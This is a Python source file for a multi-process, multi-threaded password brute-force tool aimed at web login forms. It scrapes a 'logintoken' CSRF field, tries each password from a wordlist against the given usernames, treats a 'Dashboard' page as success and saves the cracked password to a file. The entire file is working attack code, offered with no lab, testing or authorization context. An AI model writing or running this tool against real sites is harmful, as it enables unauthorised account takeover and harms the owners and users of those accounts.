import requests
from bs4 import BeautifulSoup
import logging
from tqdm import tqdm
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import Pool, Manager, current_process

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_user_input():
    """Prompt the user for input and return a configuration dictionary."""
    login_url = input("Enter the login URL: ")
    usernames = input("Enter the usernames (comma-separated): ").split(',')
    usernames = [username.strip() for username in usernames]  # Remove any extra spaces
    password_file = input("Enter the path to the password file: ")
    chunk_size = int(input("Enter the chunk size (number of passwords per chunk): "))
    num_threads = int(input("Enter the number of threads per process: "))
    num_processes = int(input("Enter the number of processes: "))
    delay = float(input("Enter the delay between attempts (in seconds): "))
    output_file = input("Enter the path to the output file for the successful password: ")

    return {
        'LoginUrl': login_url,
        'Usernames': usernames,
        'PasswordFile': password_file,
        'ChunkSize': chunk_size,
        'NumThreads': num_threads,
        'NumProcesses': num_processes,
        'Delay': delay,
        'OutputFile': output_file
    }

def attempt_login(session, login_url, username, password):
    """Attempt to log in with the given username and password."""
    try:
        response = session.get(login_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'logintoken'})['value']
        payload = {
            'username': username,
            'password': password,
            'logintoken': csrf_token
        }
        response = session.post(login_url, data=payload, allow_redirects=True, timeout=5)
        if "Dashboard" in response.text:  # Adjust this check based on your site's specific success criteria
            return True, password
        else:
            return False, password
    except Exception as e:
        logging.error(f"Error attempting login with password {password}: {e}")
        return False, password

def write_successful_password(password, output_file, lock):
    """Write the successful password to the output file."""
    try:
        with lock:
            with open(output_file, 'w') as file:
                file.write(password)
        logging.info(f"Successful password {password} written to {output_file}")
    except Exception as e:
        logging.error(f"Error writing successful password to file: {e}")

def brute_force_attack_chunk(session, login_url, username, passwords_chunk, output_file, delay, lock):
    """Perform brute-force attack on a chunk of passwords."""
    for password in passwords_chunk:
        success, password = attempt_login(session, login_url, username, password)
        if success:
            logging.info(f"Login successful with password: {password} for username: {username}")
            write_successful_password(password, output_file, lock)
            return password
        else:
            logging.info(f"Login failed with password: {password} for username: {username}")
        if delay > 0:
            time.sleep(delay)
    return None

def process_chunk(login_url, usernames, passwords_chunk, chunk_size, num_threads, output_file, delay, lock):
    """Process a chunk of passwords using multiple threads."""
    logging.info(f"Process {current_process().name} started with chunk size: {len(passwords_chunk)}")
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for username in usernames:
            session = requests.Session()
            futures.extend([executor.submit(brute_force_attack_chunk, session, login_url, username, chunk, output_file, delay, lock)
                            for chunk in [passwords_chunk[i:i + chunk_size] for i in range(0, len(passwords_chunk), chunk_size)]])
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                logging.info(f"Process {current_process().name} found successful password: {result}")
                return result
    return None

def brute_force_attack_multi_process(login_url, usernames, passwords, chunk_size, num_threads, num_processes, output_file, delay):
    """Perform a multi-process brute-force attack on the password list."""
    password_chunks = [passwords[i:i + chunk_size * num_threads] for i in range(0, len(passwords), chunk_size * num_threads)]
    manager = Manager()
    lock = manager.Lock()

    with Pool(processes=num_processes) as pool:
        results = [pool.apply_async(process_chunk, (login_url, usernames, chunk, chunk_size, num_threads, output_file, delay, lock)) for chunk in password_chunks]
        
        for result in results:
            success_password = result.get()
            if success_password:
                logging.info(f"Master process found successful password: {success_password}")
                return success_password

    logging.info("None of the passwords worked.")
    return None

if __name__ == '__main__':
    config = get_user_input()

    login_url = config['LoginUrl']
    usernames = config['Usernames']
    password_file = config['PasswordFile']
    chunk_size = config['ChunkSize']
    num_threads = config['NumThreads']
    num_processes = config['NumProcesses']
    delay = config['Delay']
    output_file = config['OutputFile']

    try:
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        logging.error(f"Password file not found: {password_file}")
        exit(1)

    successful_password = brute_force_attack_multi_process(login_url, usernames, passwords, chunk_size, num_threads, num_processes, output_file, delay)

    if successful_password:
        logging.info(f"Successful password found: {successful_password}")
    else:
        logging.info("None of the passwords worked.")
